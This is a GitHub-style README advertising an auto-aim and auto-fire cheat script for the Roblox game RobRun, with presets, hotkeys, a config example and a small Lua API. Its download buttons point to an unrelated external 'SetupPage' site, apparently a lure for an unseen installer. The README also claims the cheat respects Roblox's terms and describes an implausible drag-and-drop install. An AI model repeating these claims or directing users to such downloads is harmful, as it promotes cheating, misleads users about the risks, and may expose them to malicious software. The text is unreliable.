# RobRun‑Auto‑Shoot  

**⚡️ Seamless, configurable auto‑shoot for RobRun**  
A lightweight utility that lets you define and switch between shooting presets on the fly, giving you precise control over target engagement in RobRun.

---  

## 🚀 Quick Start  

|  |  |
|---|---|
| **Download** | <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Download‑Release‑blue?style=for-the-badge&logo=download" alt="Download"></a> |
| **Docs** | <a href="https://github.com/FiscalPresent/RobRun-Auto-Shoot/wiki"><img src="https://img.shields.io/badge/Documentation‑Wiki‑brightgreen?style=for-the-badge&logo=github" alt="Wiki"></a> |
| **Issues** | <a href="https://github.com/FiscalPresent/RobRun-Auto-Shoot/issues"><img src="https://img.shields.io/badge/Report‑Issue‑red?style=for-the-badge&logo=bugatti" alt="Issues"></a> |
| **License** | <a href="LICENSE"><img src="https://img.shields.io/badge/License‑MIT‑lightgrey?style=for-the-badge" alt="License"></a> |

---  

## 📚 What Is It?

RobRun‑Auto‑Shoot is a **configurable shooting script** built for the Roblox game *RobRun*.  
It lets you:

* **Create multiple presets** – each preset stores aim‑speed, fire‑rate, recoil compensation, and target filters.  
* **Switch presets instantly** – hot‑key toggles let you adapt to any situation without leaving the game.  
* **Fine‑tune on the fly** – a tiny UI panel appears in‑game for real‑time adjustments.  

All of this runs **client‑side**, respects Roblox’s terms of service, and is designed to be **non‑intrusive**.

---  

## 🛠️ Features  

| Feature | Description |
|---|---|
| **Preset Engine** | Save as many shooting profiles as you need. |
| **Hot‑Key Bindings** | Map any key combination to a preset or action. |
| **Dynamic Targeting** | Filter by distance, health, or team affiliation. |
| **Realtime UI** | Minimal overlay showing active preset and stats. |
| **Lightweight** | < 150 KB, no heavy dependencies. |
| **Cross‑Platform** | Works on Windows, macOS, and Linux (via Roblox client). |

---  

## 📦 Installation  

1. Click the **Download** button above.  
2. Extract the zip file to a folder of your choice.  
3. Open Roblox, launch *RobRun*, then run the `Release.lua` script from the extracted folder (drag‑and‑drop onto the Roblox window).  
4. Follow the on‑screen wizard to map your hot‑keys and create the first preset.  

> **Tip:** Keep the extracted folder alongside your Roblox installation to simplify future updates.

---  

## ⚙️ Configuration  

All settings live in `config.json`. Below is a minimal example:

```json
{
  "presets": [
    {
      "name": "Sniper",
      "aimSpeed": 0.12,
      "fireRate": 0.8,
      "recoilCompensation": true,
      "targetFilter": {
        "team": "enemy",
        "maxDistance": 250
      },
      "hotkey": "F1"
    },
    {
      "name": "Burst",
      "aimSpeed": 0.04,
      "fireRate": 0.2,
      "recoilCompensation": false,
      "targetFilter": {
        "team": "any",
        "maxDistance": 150
      },
      "hotkey": "F2"
    }
  ]
}
```

*Edit the JSON directly or use the in‑game UI → **Settings → Edit Config** to make changes without leaving the match.*

---  

## 🎮 How To Use  

| Action | Default Hot‑Key |
|---|---|
| **Activate current preset** | `Right‑Click` (hold) |
| **Cycle to next preset** | `F1` (or your custom binding) |
| **Toggle UI overlay** | `Ctrl + U` |
| **Open config editor** | `Ctrl + E` |
| **Pause auto‑shoot** | `Pause/Break` |

You can reassign any of these keys in the UI or by editing `config.json`.

---  

## 🧩 Extending the utility  

The repo ships with a small **API** (`api.lua`) that other scripts can import:

```lua
local AutoShoot = require("api")
AutoShoot.setPreset("Sniper")
AutoShoot.toggle()
```

Feel free to:

* Add custom target‑filter logic.  
* Hook into Roblox events for smarter engagement.  
* Contribute new UI themes (see `themes/` folder).

---  

## 🤝 Contributing  

1. Fork the repo.  
2. Create a feature branch (`git checkout -b feature/your‑idea`).  
3. Submit a pull request with a clear description of the change.  

All contributions must adhere to the **MIT License** and respect Roblox’s community standards.

---  

## 📜 License  

This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for details.  

---  

## 🙏 Acknowledgements  

* **FiscalPresent** – original author & maintainer.  
* The Roblox developer community for feedback and testing.  

---  

**Enjoy precise, hassle‑free shooting in RobRun!**  

<a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/Start‑Now‑orange?style=for-the-badge&logo=rocket" alt="Start Now"></a>